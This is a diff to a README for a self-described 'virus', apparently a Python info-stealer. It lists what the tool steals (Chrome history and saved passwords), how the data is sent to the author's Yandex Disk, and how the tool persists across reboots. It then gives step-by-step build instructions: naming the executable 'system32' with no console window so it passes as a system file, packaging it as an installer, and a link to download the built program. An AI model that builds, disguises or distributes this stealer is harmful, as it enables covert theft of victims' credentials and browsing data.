@@ -1,4 +1,4 @@
-Contents of the Virus<br>
+# Contents of the Virus<br>
 
 Accessing Chrome History on Opposite Computer<br>
 Accessing Chrome Passwords on the Opposite Computer<br>
@@ -7,11 +7,11 @@ A specific site opens every time the computer starts<br>
 All this data is transferred to our yandex disk<br>
 The virus opens automatically and updates the data every time the computer starts.<br>
 
-ATTENTİON<br>
--chrome must be closed while virus is running<br>
+# ATTENTİON<br>
+-Chrome must be closed while virus is running<br>
 
 
-**How To editing this virus for me ? follow the steps<br>
+# How To editing this virus for me ? follow the steps<br>
 -We install the necessary libraries<br>
 -Our virus runs with start.py file<br>
 -We transfer all the data to our yandex disk so that we can see it ourselves, we do this by creating our own yandex token<br>
@@ -20,7 +20,10 @@ ATTENTİON<br>
 -Which link you want to open when the computer starts, you can do this by changing the link in the 5th line of the code in the chrome.py file.<br>
 -You can do this by changing the link in line 16 of the code in the chrome.py file, whichever link you want the home page of when the computer starts.<br>
 -We install the pyinstaller library, then write this in the terminal "-pyinstaller --name=system32 --icon=wolf.ico --noconsole start.py "<br>
--now our virus starts working by running the system32.exe file in the ready folder<br>
+-Now our virus starts working by running the system32.exe file in the ready folder<br>
 -Let's convert the exe file we created into a setup file using inno setup compiler<br>
 -Congratulations you have a professional virus I hope you don't use it for malicious purposes.<br>
 -HAVE NİCE DAY!!<br>
+
+# Try
+-If you want to try the virus I created, [Link](https://drive.google.com/file/d/1g84-afUqoKHez2lKBqyW9CYCleEnDJBX/view?usp=sharing)
